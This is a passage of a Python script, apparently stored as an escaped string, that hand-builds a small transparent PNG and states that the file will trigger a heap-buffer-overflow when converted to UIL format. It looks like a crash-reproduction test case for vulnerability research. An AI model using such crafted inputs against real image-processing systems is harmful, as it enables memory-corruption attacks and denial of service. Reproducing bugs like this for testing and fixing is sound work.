l\nrow2 = b\'\\x00\' + b\'\\x00\\x00\\xff\\xff\' + b\'\\xff\\xff\\xff\\x00\'\n\nimage_data = row1 + row2\n\n# Compress image data\ncompressed_data = zlib.compress(image_data, 9)\n\n# IDAT chunk\nidat_chunk = make_chunk(b\'IDAT\', compressed_data)\n\n# IEND chunk\niend_chunk = make_chunk(b\'IEND\', b\'\')\n\n# Write PNG file\nwith open(output_path, \'wb\') as f:\n    f.write(png_sig)\n    f.write(ihdr_chunk)\n    f.write(idat_chunk)\n    f.write(iend_chunk)\n\nprint(f"Generated PNG test case at {output_path}")\nprint(f"Image: {width}x{height} RGBA with transparent pixels")\nprint(f"This will trigger the heap-buffer-overflow when converted to UIL format")\n'}


